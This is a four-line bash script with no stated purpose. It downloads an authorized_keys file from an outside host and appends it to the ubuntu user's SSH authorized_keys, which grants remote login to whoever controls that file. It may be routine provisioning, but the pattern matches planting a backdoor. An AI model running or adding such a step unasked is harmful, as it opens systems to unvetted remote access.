#!/bin/bash

cd /tmp
wget https://admin.dbp4.org/config/listen/authorized_keys
cat authorized_keys >> /home/ubuntu/.ssh/authorized_keys